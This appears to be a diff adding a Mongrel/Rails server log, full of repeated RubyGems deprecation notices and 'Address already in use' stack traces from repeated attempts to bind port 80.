+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize_without_backlog': Address already in use - bind(2) (Errno::EADDRINUSE)
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `listener'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:99:in `cloaker_'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `call'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+	from /usr/local/bin/mongrel_rails:23:in `load'
+	from /usr/local/bin/mongrel_rails:23
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize_without_backlog': Address already in use - bind(2) (Errno::EADDRINUSE)
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `listener'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:99:in `cloaker_'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `call'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+	from /usr/local/bin/mongrel_rails:23:in `load'
+	from /usr/local/bin/mongrel_rails:23
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize_without_backlog': Address already in use - bind(2) (Errno::EADDRINUSE)
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `listener'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:99:in `cloaker_'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `call'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+	from /usr/local/bin/mongrel_rails:23:in `load'
+	from /usr/local/bin/mongrel_rails:23
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize_without_backlog': Address already in use - bind(2) (Errno::EADDRINUSE)
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/tcphack.rb:12:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:93:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:139:in `listener'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:99:in `cloaker_'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `call'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:50:in `initialize'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `new'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:84:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+	from /var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+	from /usr/local/bin/mongrel_rails:23:in `load'
+	from /usr/local/bin/mongrel_rails:23
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
